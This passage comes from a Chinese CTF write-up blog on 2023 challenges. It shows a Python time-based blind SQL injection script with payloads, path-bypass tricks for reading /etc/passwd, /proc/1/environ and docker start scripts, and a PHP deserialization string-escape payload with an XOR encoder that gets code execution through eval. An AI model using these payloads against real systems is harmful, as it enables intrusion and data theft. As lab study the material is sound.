-&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">                <span class="comment">#Flllag</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># burp0_url = &quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;substr(group_concat(column_name),&#123;&#125;,1)) from information_schema.columns where table_name=&#x27;Flllag&#x27;))=&#123;&#125; then (select sum(1) FROM &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.views D) else 1 end-- -&quot;.format(i, j)</span></span><br><span class="line">                <span class="comment">#Flagg</span></span><br><span class="line">            <span class="comment"># burp0_url = &quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;substr(group_concat(Flagg),&#123;&#125;,1)) from Flllag))=&#123;&#125; then (select sum(1) FROM &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.views D) else 1 end-- -&quot;.format(i, j)</span></span><br><span class="line"></span><br><span class="line">            burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7,en-US;q=0.6&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">            r = requests.get(burp0_url, headers=burp0_headers, timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="comment"># time.sleep(1)</span></span><br><span class="line">            <span class="comment"># print(j,r.text)</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;kfrL9n0upSAOMvY8hcO8uLdYMo9mZjHY&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230724110506033.png" alt="image-20230724110506033"></p><p>这里解释一下这个<code>case when condition then result</code>  的意思</p><p>就是当<strong>查询内容</strong>满足这个<code>condition</code>的时候就会返回<code>result</code> </p><p><strong>上述代码的意思就是说匹配到的时候就会延时</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul><li>其实就是考察的是<strong>时间盲注</strong>  但是只是需要替换一些函数</li></ul><h2 id="hinder"><a href="#hinder" class="headerlink" title="hinder"></a>hinder</h2><p>这道题预期解其实是挺复杂的  但是这题存在非预期  (<strong>原因是出题人在运行完sh文件后没把该文件删除  导致出现了非预期)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目提示了 </span><br><span class="line">访问/hinder</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230725111811018.png" alt="image-20230725111811018"></p><p>没访问之前是可以看到这个网站的服务器是<code>java</code>的    (<strong>是个挺重要的信息</strong>)</p><p><img src="../images/image-20230725112023678.png" alt="image-20230725112023678"></p><p>这里话是有两个绕过方法</p><ul><li>一个是url编码  (<strong>因为这里是前端校验</strong>)</li><li>另一个是使用    <code>/;/hinder</code></li><li><code>/anything/../hinder/</code> <strong>绕过路径 (这样也行)</strong></li></ul><p><img src="../images/image-20230725112140700.png" alt="image-20230725112140700"></p><p>这里的话讲一下这个  <code>/;/hinder</code>  绕过的原理</p><p><img src="../images/image-20230725112306230.png" alt="image-20230725112306230"></p><p><img src="../images/image-20230725112342291.png" alt="image-20230725112342291"></p><p>其实这里的话就是实现任意文件读取了   (<strong>看到这个<code>action</code>的时候其实可以想到这个<code>struct2</code></strong>)</p><p>尝试读取一下<code>/etc/passwd</code></p><p><img src="../images/image-20230725113456496.png" alt="image-20230725113456496"></p><h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a><strong>非预期解</strong></h3><p>尝试读取出题人常用的docker启动脚本   <strong>例如 <code>/run.sh  /start.sh</code></strong></p><p><img src="../images/1689930726240-f021d0b4-1312-46c6-8638-1a3398dd542f.png" alt="img"></p><p>然后读取该文件就行了 </p><p><img src="../images/1689930751274-96d92ed6-3259-4bcd-bdda-dc7be9aea343.png" alt="img"></p><p><strong>看到这些非预期解以后   以后读取文件的话可以尝试读取这两个地方的东西了</strong></p><ul><li><code>/proc/1/environ</code></li><li><code>/proc/1/cmdline</code></li><li><code>/run.sh  /start.sh 等等之类的docker启动常用脚本</code></li></ul><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p><a href="https://www.yuque.com/dat0u/ctf/vl4hurp3yvqqsckz#BPCx1">巅峰极客2023 hinder</a></p><p>这个是使用的是<code>struct2</code>的漏洞来解的题</p><p>这里还没有一个完整的wp来看   所以先不写</p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a><strong>unserialize</strong></h2><p><strong>启动脚本</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it -d -p 12345:80 -e FLAG=flag&#123;8382843b-d3e8-72fc-6625-ba5269953b23&#125; lxxxin/dfjk2023_unserialize</span></span><br></pre></td></tr></table></figure><p>访问  <code>/www.zip</code>  得到源码</p><p><strong>function.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;aaaa&#x27;</span>, <span class="string">&#x27;bbbbbb&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bbbbbb&#x27;</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>(<strong>这里的话大佬应该能猜到是反序列化逃逸</strong>)      反正我没猜到…………</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;login.html&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$root</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>];</span><br><span class="line"><span class="variable">$pwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="variable">$login</span> = <span class="keyword">new</span> <span class="title function_ invoke__">push_it</span>(<span class="variable">$root</span>, <span class="variable">$pwd</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="title function_ invoke__">b</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$login</span>));</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;location.href=`./login.php`;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(`Login First!`);location.href=`./index.php`;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">a</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$login</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>my.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$x</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xx</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;x = <span class="variable">$xx</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;x) &#123;</span><br><span class="line"><span class="variable">$preg_match</span> = <span class="string">&#x27;return preg_match(&quot;/[A-Za-z0-9]+/i&quot;, $this-&gt;x);&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">eval</span>(<span class="variable">$preg_match</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$preg_match</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&quot;save_waf&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">push_it</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$root</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$pwd</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$root</span>, <span class="variable">$pwd</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;root = <span class="variable">$root</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;pwd = <span class="variable">$pwd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;root);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;pwd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;root) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;pwd)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Hello, <span class="subst">$this</span>-&gt;root&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;out!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>开始代码审计</strong></p><p><img src="../images/image-20230724162222075.png" alt="image-20230724162222075"></p><p><strong>首先是在<code>index.php</code>处进行序列化操作 </strong>   <strong>然后在用b函数进行替换操作</strong></p><p><img src="../images/image-20230724162404370.png" alt="image-20230724162404370"></p><p><strong>最后是在这个<code>login.php</code>处先将序列化字符串进行a函数替换  然后再进行反序列化</strong></p><p><strong>命令执行是在这个地方</strong></p><p><img src="../images/image-20230724162637962.png" alt="image-20230724162637962"></p><p>就是在<code>my.php</code>这个里面  其实就是无数字字母RCE  但是这不是关键  关键是如何进行<strong>序列化字符串逃逸</strong></p><p><strong>先使用之前羽师傅写的一个异或脚本来生成自己想要执行的命令</strong></p><p><strong>xor.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>xor.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>使用方法就是先使用php生成字典  然后再使用python来生成自己想要的命令</strong></p><p><img src="../images/image-20230724163944186.png" alt="image-20230724163944186"></p><p>然后开始构造链子</p><p><img src="../images/image-20230724164349115.png" alt="image-20230724164349115"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;pull_it&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;pull_itx&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot;(&quot;</span> <span class="string">&quot;^&quot;</span>&#123;&#123;&#123;|``<span class="string">&quot;)(&quot;</span><span class="string">&quot;^&quot;</span>``| /`*<span class="string">&quot;);&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//没编码前</span></span><br><span class="line">O%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>pull_it%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>pull_it%<span class="number">00</span>x%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A41%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">28</span>%<span class="number">22</span>%<span class="number">08</span>%<span class="number">02</span>%<span class="number">08</span>%<span class="number">08</span>%<span class="number">05</span>%<span class="number">0</span>D%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>C%<span class="number">60</span>%<span class="number">60</span>%<span class="number">22</span>%<span class="number">29</span>%<span class="number">28</span>%<span class="number">22</span>%<span class="number">03</span>%<span class="number">01</span>%<span class="number">08</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">06</span>%<span class="number">00</span>%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">60</span>%<span class="number">60</span>%<span class="number">7</span>C+%<span class="number">2</span>F%<span class="number">60</span>%<span class="number">2</span>A%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"><span class="comment">//编码后                                                 </span></span><br></pre></td></tr></table></figure><p><strong>因为这里的是因为不能传入这个<code>pull_it</code>这个类直接进行反序列化</strong></p><p><img src="../images/image-20230724190117444.png" alt="image-20230724190117444"></p><p><strong>所以说我们就得尝试进行字符逃逸  把这个序列化后的结果加进去</strong></p><p>开始逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=<span class="string">&quot;;s:5:&quot;</span>datou<span class="string">&quot;;O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A41%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%03%01%08%00%00%06%00%22%5E%22%60%60%7C+%2F%60%2A%22%29%3B%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>(逃逸了14个字符)</p><p>这里解释一下</p><p><img src="../images/image-20230724190419607.png" alt="image-20230724190419607"></p><p><strong>刚好是14个  其实也可以不是14个  这要看你自己的构造了</strong></p><p>先使用常规的方法生成一下实例化的内容·</p><p><img src="../images/image-20230724190736840.png" alt="image-20230724190736840"></p><p><code>aa</code>是我们<code>root</code>传入的位置  <code>bb</code>是我们<code>pwd</code>传入的位置  </p><p><img src="../images/image-20230724190920747.png" alt="image-20230724190920747"></p><p>这是<strong>payload</strong>   这里一共传入了<strong>82个b</strong>字符   经过这个反序列化的时候 <strong>a函数</strong>的替换</p><p><img src="../images/image-20230724191030189.png" alt="image-20230724191030189"></p><p>会变成42个字符a   于是给我们提供了42位的逃逸空间</p><p>于是我们就可以查看</p><p><img src="../images/image-20230724191238844.png" alt="image-20230724191238844"></p><p><img src="../images/image-20230724191508816.png" alt="image-20230724191508816"></p><p>然后就是<code>13+29==42</code>就会成功逃逸成功  后面跟着<code>pull_it</code>这个序列化后的恶意类</p><p>因为逃逸的关系  (<strong>原本的<code>pwd</code>参数也变成了<code>root</code>的值，然后又添加进来一个<code>datou</code>，刚好满足两个参数的要求</strong>)</p><p>于是就成功逃逸出来了(<strong>后面多出来的一些字符并不影响 并且直接添加一个序列化后的类也是可以反序列化的</strong> )</p><p><img src="../images/image-20230724191908997.png" alt="image-20230724191908997"></p><p><strong>本地测试过了</strong>  </p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul><li><strong>重新温习了字符串逃逸这个知识点</strong></li><li><strong>学到了这个在一个序列化后的字符串后面继续添加一个别的类的序列化字符串也是可以一起进行反序列化</strong></li></ul><p><strong>测试过程的代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 